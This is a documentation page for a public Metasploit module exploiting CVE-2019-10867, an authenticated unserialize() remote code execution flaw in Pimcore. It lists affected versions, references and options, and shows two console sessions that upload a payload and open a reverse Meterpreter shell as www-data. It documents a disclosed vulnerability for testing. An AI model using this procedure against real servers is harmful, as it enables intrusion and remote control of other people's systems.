---
layout: default
---

# Pimcore from 4.0.0 to 5.6.6 Unserialize RCE (CVE-2019-10867)

This module exploits a PHP unserialize() in Pimcore before 5.7.1 to execute arbitrary code. An authenticated user with "classes" permission could exploit the vulnerability.

The vulnerability exists in the "ClassController.php" class, where the "bulk-commit" method make it possible to exploit the unserialize function when passing untrusted values in "data" parameter.

Tested on Pimcore 5.6.6, 5.6.5, 5.6.4, 5.6.3, 5.6.2, 5.6.1, 5.6.0, 5.5.4, 5.5.3, 5.5.2, 5.5.1, 5.4.4, 5.4.3, 5.4.2, 5.4.1, 5.4.0 with the Symfony unserialize payload.

Tested on Pimcore 4.6.5, 4.6.4, 4.6.3, 4.6.2, 4.6.1, 4.6.0, 4.5.0, 4.4.3, 4.4.2, 4.4.1, 4.4.0, 4.3.1, 4.3.0, 4.2.0, 4.1.3, 4.1.2, 4.1.1, 4.1.0, 4.0.1, 4.0.0 with the Zend unserialize payload.

## Module Name

exploit/multi/http/pimcore_unserialize_rce

## Authors

* Daniele Scanu (Discovery)
* Fabio Cogno (Metasploit Module)

## Disclosure date

Mar 11, 2019

## Actions

* CHECK
* EXPLOIT

## Reliability

[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## References

* [MITRE entry](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10867)
* [Pimcore GitHub fix](https://github.com/pimcore/pimcore/commit/38a29e2f4f5f060a73974626952501cee05fda73)
* [SNYK entry](https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-173998)

## Required Options

* RHOST - The target address
* RPORT - The target port (TCP)
* USERNAME - Username to authenticate with
* PASSWORD - Password to authenticate with

## Not Required Options

* TARGETURI - Base Pimcore directory path ("/" is the default)

## Basic Usage

To display the available options, load the module within the Metasploit console and run the commands 'show options'.

### Sample on Pimcore 5.x

```
msf5 > use exploit/multi/http/pimcore_unserialize_rce 
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rhost target.com
rhost => target.com
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rport 8566
rport => 8566
msf5 exploit(multi/http/pimcore_unserialize_rce) > set username admin
username => admin
msf5 exploit(multi/http/pimcore_unserialize_rce) > set password pimcore
password => pimcore
msf5 exploit(multi/http/pimcore_unserialize_rce) > check
[*] 192.168.2.59:8566 - The target service is running, but could not be validated.
msf5 exploit(multi/http/pimcore_unserialize_rce) > exploit

[*] Started reverse TCP handler on 10.0.8.2:4444 
[+] Authentication successful: admin:pimcore
[*] Pimcore version: 5.6.6
[*] Pimcore build: 9722d19576f9e49969d4a3708e045fa481eaad02
[+] The target is vulnerable!
[+] JSON paylod uploaded successful: /var/www/html/var/tmp/bulk-import.tmp
[*] Selected payload: Pimcore 5.x (Symfony unserialize payload)
[*] Sending stage (38247 bytes) to 192.168.2.59
[*] Meterpreter session 1 opened (10.0.8.2:4444 -> 192.168.2.59:34128) at 2019-04-07 12:04:08 +0200
[!] This exploit may require manual cleanup of '/var/www/html/var/tmp/bulk-import.tmp' on the target

meterpreter > 
[+] Deleted /var/www/html/var/tmp/bulk-import.tmp

meterpreter > getuid
Server username: www-data (33)
meterpreter > quit
[*] Shutting down Meterpreter...

[*] 192.168.2.59 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(multi/http/pimcore_unserialize_rce) > 
```

### Sample on Pimcore 4.x

```
msf5 > use exploit/multi/http/pimcore_unserialize_rce 
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rhost target.com
rhost => target.com
msf5 exploit(multi/http/pimcore_unserialize_rce) > set rport 8465
rport => 8465
msf5 exploit(multi/http/pimcore_unserialize_rce) > set username admin
username => admin
msf5 exploit(multi/http/pimcore_unserialize_rce) > set password P1mc0r3_4dm1n
password => P1mc0r3_4dm1n
msf5 exploit(multi/http/pimcore_unserialize_rce) > check
[*] 192.168.2.59:8465 - The target service is running, but could not be validated.
msf5 exploit(multi/http/pimcore_unserialize_rce) > exploit

[*] Started reverse TCP handler on 10.0.8.2:4444 
[+] Authentication successful: admin:P1mc0r3_4dm1n
[*] Pimcore version: 4.6.5
[*] Pimcore build: 4123
[+] The target is vulnerable!
[+] JSON paylod uploaded successful: /var/www/html/website/var/system/bulk-import.tmp
[*] Selected payload: Pimcore 4.x (Zend unserialize payload)
[*] Sending stage (38247 bytes) to 192.168.2.59
[*] Meterpreter session 1 opened (10.0.8.2:4444 -> 192.168.2.59:57882) at 2019-04-07 12:00:20 +0200
[+] Deleted /var/www/html/website/var/system/bulk-import.tmp

meterpreter > getuid
Server username: www-data (33)
meterpreter > quit
[*] Shutting down Meterpreter...

[*] 192.168.2.59 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(multi/http/pimcore_unserialize_rce) > 
```

---

[back](./)